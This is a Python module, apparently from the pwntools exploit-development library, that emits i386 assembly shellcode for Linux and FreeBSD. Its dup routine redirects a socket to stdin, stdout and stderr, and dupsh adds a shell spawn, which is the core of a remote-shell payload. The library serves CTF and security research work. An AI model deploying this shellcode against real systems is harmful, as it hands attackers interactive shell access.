from pwn.internal.shellcode_helper import *
from sh import sh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
def dup(sock = 'ebp', os = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr."""

    if os == 'freebsd':
        return """
dup:
        setfd esi, %s
        push byte 2
        pop ebp
        push SYS_dup2
        pop eax
.loop:
        pushad
        int 0x80
        popad
        dec ebp
        jns .loop
.after:
""" % str(sock)
    elif os == 'linux':
        return """
dup:
        setfd ebx, %s
        push byte 3
        pop ecx
.loop:
        dec ecx
        push byte SYS_dup2
        pop eax
        int 0x80
        jnz .loop
""" % str(sock)
    else:
        bug('OS was neither linux nor freebsd')

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
def dupsh(sock = 'ebp', os = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell."""
    if os == 'linux':
        return dup(sock), sh(False)
    elif os == 'freebsd':
        return dup(sock), sh(True)
    else:
        bug('OS was neither linux nor freebsd')


